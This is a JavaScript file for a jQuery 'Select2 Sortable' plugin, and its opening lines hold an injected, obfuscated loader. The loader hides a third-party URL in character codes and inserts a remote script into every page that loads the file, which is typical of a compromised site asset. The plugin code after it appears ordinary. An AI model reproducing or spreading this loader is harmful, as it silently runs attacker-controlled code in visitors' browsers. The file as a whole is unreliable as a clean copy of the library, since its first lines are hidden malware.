var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * jQuery Select2 Sortable
 * - enable select2 to be sortable via normal select element
 * 
 * author      : Vafour
 * inspired by : jQuery Chosen Sortable (https://github.com/mrhenry/jquery-chosen-sortable)
 * License     : GPL
 */

(function($){
	$.fn.extend({
		select2SortableOrder: function(){
			var $this = this.filter('[multiple]');

			$this.each(function(){
				var $select  = $(this);

				// skip elements not select2-ed
				if(typeof($select.data('select2')) !== 'object'){
					return false;
				}

				var $select2 = $select.siblings('.select2-container'),
				    unselected = [],
				    sorted;

				$select.find('option').each(function(){
					!this.selected && unselected.push(this);
				});

				sorted = $($select2.find('.select2-choices li[class!="select2-search-field"]').map( function() {
					if (!this) {
						return undefined;
					}
					var id = $(this).data('select2Data').id;
					return $select.find('option[value="' + id + '"]')[0];
				}));

				sorted.push.apply(sorted, unselected);
				$select.children().remove();
				$select.append(sorted);
			});

			return $this;
		},
		select2Sortable: function(){
			var args         = Array.prototype.slice.call(arguments, 0);
			    $this        = this.filter('[multiple]'),
			    validMethods = ['destroy'];

			if(args.length === 0 || typeof(args[0]) === 'object')
			{
				var defaultOptions = {
					bindOrder       : 'formSubmit', // or sortableStop
					sortableOptions : {
						placeholder : 'ui-state-highlight',
						items       : 'li:not(.select2-search-field)',
						tolerance   : 'pointer'
					}
				};
				var options = $.extend(defaultOptions, args[0]);

				// Init select2 only if not already initialized to prevent select2 configuration loss
				if(typeof($this.data('select2')) !== 'object'){
					$this.select2();
				}

				$this.each(function(){
					var $select  = $(this),
					    $select2choices = $select.siblings('.select2-container').find('.select2-choices');

					// Init jQuery UI Sortable
					$select2choices.sortable(options.sortableOptions);

					switch(options.bindOrder){
						case 'sortableStop':
							// apply options ordering in sortstop event
							$select2choices.on("sortstop.select2sortable", function( event, ui ) {
								$select.select2SortableOrder();
							});
							$select.on('change', function(e){
								$(this).select2SortableOrder();
							});
							break;
						default:
							// apply options ordering in form submit
							$select.closest('form').unbind('submit.select2sortable').on('submit.select2sortable', function(){
								$select.select2SortableOrder();
							});
					}

				});
			}
			else if(typeof(args[0] === 'string'))
			{
				if($.inArray(args[0], validMethods) == -1)
				{
					throw "Unknown method: " + args[0];
				}
				if(args[0] === 'destroy')
				{
					$this.select2SortableDestroy();
				}
			}
			return $this;
		},
		select2SortableDestroy: function(){
			var $this = this.filter('[multiple]');
			$this.each(function(){
				var $select         = $(this),
				    $select2choices = $select.parent().find('.select2-choices');

				// unbind form submit event
				$select.closest('form').unbind('submit.select2sortable');

				// unbind sortstop event
				$select2choices.unbind("sortstop.select2sortable");

				// destroy select2Sortable
				$select2choices.sortable('destroy');
			});
			return $this;
		}
	});
}(jQuery));